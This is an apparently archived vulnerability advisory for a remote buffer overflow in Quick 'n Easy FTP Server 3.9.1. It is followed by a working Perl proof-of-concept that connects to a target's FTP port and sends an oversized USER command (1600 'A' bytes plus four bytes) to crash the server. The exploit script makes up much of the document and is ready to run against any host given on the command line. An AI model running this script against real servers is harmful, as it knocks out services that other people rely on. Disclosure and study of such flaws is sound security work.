source: http://www.securityfocus.com/bid/42186/info

Quick 'n Easy FTP Server is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input before copying it to an insufficiently sized memory buffer.

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

Quick 'n Easy FTP Server 3.9.1 is vulnerable; other versions may also be affected. 

#!/usr/bin/perl -w
#DoS Exploit of Quick Easy Ftp Server version <=3.9.1 USER COMMAND Buffer Overflow
#Vulnerability Discoverer & Autor : demonalex[at]163[dot]com
use Socket;
$host=shift;
$port=shift || '21';
if(!defined($host)){
die("usage: $0 \$host [\$port]\n");
}
#$payload='A'x1604;
$payload=('A'x1600)."\x3D\x41\x41\x41";         #mov     dword ptr [ebx+4], ebp
$target_ip=inet_aton($host);
$target=sockaddr_in($port, $target_ip);
socket(SOCK, AF_INET, SOCK_STREAM, 6);
connect(SOCK, $target);
undef($content);
recv(SOCK, $content, 100, 0);                   #get ftp banner
send(SOCK, "USER "."$payload\r\n", 0);
printf("send ok!\n");
close(SOCK);
exit(0);